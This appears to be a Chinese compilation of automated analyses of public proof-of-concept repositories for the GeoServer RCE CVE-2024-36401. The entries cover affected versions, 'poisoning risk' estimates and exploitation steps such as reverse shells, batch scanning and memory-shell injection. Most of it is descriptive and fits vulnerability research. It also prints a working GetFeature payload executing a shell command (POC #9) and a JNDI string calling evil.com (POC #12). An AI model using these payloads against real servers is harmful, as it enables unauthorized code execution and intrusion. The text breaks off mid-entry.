CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

